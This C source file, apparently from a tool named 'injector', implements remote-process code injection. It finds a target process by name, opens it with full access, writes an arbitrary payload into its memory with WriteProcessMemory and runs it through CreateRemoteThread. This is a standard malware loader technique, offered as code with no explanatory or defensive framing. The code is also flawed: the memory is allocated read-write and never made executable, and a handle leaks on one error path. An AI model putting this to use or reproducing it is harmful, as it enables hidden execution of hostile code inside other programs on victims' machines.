#include "injector.h"
DWORD GetProcId(const wchar_t* procName)
{
    DWORD procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 procEntry;
        procEntry.dwSize = sizeof(procEntry);

        if (Process32First(hSnap, &procEntry))
        {
            do
            {
                if (!_wcsicmp(procEntry.szExeFile, procName))
                {
                    procId = procEntry.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &procEntry));
        }
    }
    CloseHandle(hSnap);
    return procId;
}

bool inject(const wchar_t* procName, char *pload,int ploadLen)
{
    void* exec_mem;
    BOOL retval;
    DWORD procId = 0;
    while (!procId)
    {
        procId = GetProcId(procName);
        Sleep(30);
    }
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, procId);
    if (hProc && hProc != INVALID_HANDLE_VALUE)
    {
        exec_mem = VirtualAllocEx(hProc, 0, ploadLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        DWORD result = WriteProcessMemory(hProc, exec_mem, pload, ploadLen, NULL);
        if (result == NULL)
        {
            return false;
        }
        HANDLE hThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
        if (hThread)
        {
            CloseHandle(hThread);
        }

    }
    else
    {
        return false;
    }
    if (hProc)
    {
        CloseHandle(hProc);
    }
    return true;


}
